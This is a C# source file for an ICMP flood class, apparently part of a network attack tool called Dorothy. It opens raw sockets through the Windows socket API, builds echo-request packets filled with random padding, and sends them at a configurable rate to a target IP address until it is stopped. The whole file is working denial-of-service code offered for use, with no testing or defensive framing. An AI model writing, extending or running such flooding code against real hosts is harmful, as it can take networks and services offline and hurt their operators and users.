using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using NLog;
using System.Security.Principal;
using System.Net;

namespace Dorothy.Models
{
    public class IcmpFlood : IDisposable
    {
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        public const int PACKET_SIZE = 1472;
        private const int AF_INET = 2;
        private const int SOCK_RAW = 3;
        private const int IPPROTO_ICMP = 1;

        private volatile bool _stopAttack;
        private readonly string _targetIp;
        private readonly long _bytesPerSecond;
        private long _totalPacketsSent;
        private readonly Stopwatch _stopwatch;
        private readonly CancellationTokenSource _cancellationSource;
        private readonly List<IntPtr> _sockets;

        [StructLayout(LayoutKind.Sequential)]
        private struct IcmpHeader
        {
            public byte Type;      // ICMP Type
            public byte Code;      // Type sub code
            public ushort Checksum;
            public ushort Id;
            public ushort Sequence;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct SockAddrIn
        {
            public short sin_family;
            public ushort sin_port;
            public uint sin_addr;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public byte[] sin_zero;
        }

        [DllImport("ws2_32.dll", CharSet = CharSet.Ansi)]
        private static extern IntPtr socket(int af, int type, int protocol);

        [DllImport("ws2_32.dll")]
        private static extern int sendto(IntPtr s, byte[] buf, int len, int flags, ref SockAddrIn to, int tolen);

        [DllImport("ws2_32.dll")]
        private static extern int closesocket(IntPtr s);

        [DllImport("ws2_32.dll")]
        private static extern uint inet_addr(string cp);

        public IcmpFlood(string targetIp, long bytesPerSecond)
        {
            if (!IsAdministrator())
                throw new UnauthorizedAccessException("ICMP flood requires administrator privileges");

            _targetIp = targetIp ?? throw new ArgumentNullException(nameof(targetIp));
            _bytesPerSecond = bytesPerSecond;
            _stopwatch = new Stopwatch();
            _cancellationSource = new CancellationTokenSource();
            _sockets = new List<IntPtr>();
        }

        public async Task StartAsync()
        {
            Logger.Info($"Starting ICMP flood against {_targetIp} with target rate of {_bytesPerSecond} bytes/sec");
            _stopwatch.Start();
            _stopAttack = false;

            try
            {
                var socket = CreateRawSocket();
                if (socket == IntPtr.Zero)
                    throw new InvalidOperationException("Failed to create raw socket");
                
                _sockets.Add(socket);
                var targetAddr = new SockAddrIn
                {
                    sin_family = AF_INET,
                    sin_addr = inet_addr(_targetIp),
                    sin_zero = new byte[8]
                };

                var packet = CreateIcmpPacket();
                var bitsPerSecond = _bytesPerSecond * 8;
                var packetsPerSecond = bitsPerSecond / (PACKET_SIZE * 8);
                var packetsPerBatch = Math.Max(1000, packetsPerSecond / 100);
                var batchIntervalMs = 10;

                while (!_stopAttack && !_cancellationSource.Token.IsCancellationRequested)
                {
                    var batchStart = DateTime.UtcNow;
                    
                    for (int i = 0; i < packetsPerBatch && !_stopAttack; i++)
                    {
                        sendto(socket, packet, packet.Length, 0, ref targetAddr, Marshal.SizeOf(targetAddr));
                        Interlocked.Increment(ref _totalPacketsSent);
                    }
                    
                    var elapsed = (DateTime.UtcNow - batchStart).TotalMilliseconds;
                    if (elapsed < batchIntervalMs)
                    {
                        await Task.Delay((int)(batchIntervalMs - elapsed), _cancellationSource.Token);
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "Error in ICMP flood");
                throw;
            }
        }

        private IntPtr CreateRawSocket()
        {
            return socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        }

        private byte[] CreateIcmpPacket()
        {
            var packet = new byte[PACKET_SIZE];
            var header = new IcmpHeader
            {
                Type = 8,  // Echo Request
                Code = 0,
                Id = (ushort)Process.GetCurrentProcess().Id,
                Sequence = 0
            };

            var headerBytes = new byte[8];
            Buffer.BlockCopy(BitConverter.GetBytes(header.Type), 0, headerBytes, 0, 1);
            Buffer.BlockCopy(BitConverter.GetBytes(header.Code), 0, headerBytes, 1, 1);
            Buffer.BlockCopy(BitConverter.GetBytes(header.Id), 0, headerBytes, 4, 2);
            Buffer.BlockCopy(BitConverter.GetBytes(header.Sequence), 0, headerBytes, 6, 2);

            Buffer.BlockCopy(headerBytes, 0, packet, 0, headerBytes.Length);
            new Random().NextBytes(packet.AsSpan(headerBytes.Length));

            var checksum = CalculateChecksum(packet);
            Buffer.BlockCopy(BitConverter.GetBytes(checksum), 0, packet, 2, 2);

            return packet;
        }

        private ushort CalculateChecksum(byte[] buffer)
        {
            int length = buffer.Length;
            int i = 0;
            uint sum = 0;
            uint data;

            while (length > 1)
            {
                data = ((uint)buffer[i] << 8) | buffer[i + 1];
                sum += data;
                if ((sum & 0xFFFF0000) > 0)
                {
                    sum &= 0xFFFF;
                    sum++;
                }
                i += 2;
                length -= 2;
            }

            if (length > 0)
            {
                sum += buffer[i];
            }

            while ((sum >> 16) > 0)
            {
                sum = (sum & 0xFFFF) + (sum >> 16);
            }

            return (ushort)(~sum);
        }

        private bool IsAdministrator()
        {
            using var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public void Stop()
        {
            _stopAttack = true;
            _cancellationSource.Cancel();
            _stopwatch.Stop();
            
            foreach (var socket in _sockets)
            {
                try
                {
                    closesocket(socket);
                }
                catch (Exception ex)
                {
                    Logger.Error(ex, "Error closing socket");
                }
            }
            _sockets.Clear();
        }

        public void Dispose()
        {
            Stop();
            _cancellationSource.Dispose();
            GC.SuppressFinalize(this);
        }
    }
} 